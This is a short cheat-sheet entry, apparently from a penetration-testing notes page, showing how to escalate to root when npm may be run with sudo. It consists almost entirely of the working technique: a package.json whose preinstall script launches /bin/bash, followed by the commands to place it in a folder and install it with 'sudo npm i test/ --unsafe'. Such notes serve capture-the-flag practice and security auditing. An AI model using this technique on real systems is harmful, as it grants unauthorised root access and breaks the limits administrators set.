---
title: "npm"
date: 2024-6-26
tags: ["npm", "nodejs", "privesc", "sudo"]
---

#### SUDO

Create a 'package.json'

```console
{
  "name": "root",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

<br>

```console
mkdir test
```

```console
mv package.json test/
```

```console
sudo npm i test/ --unsafe
```
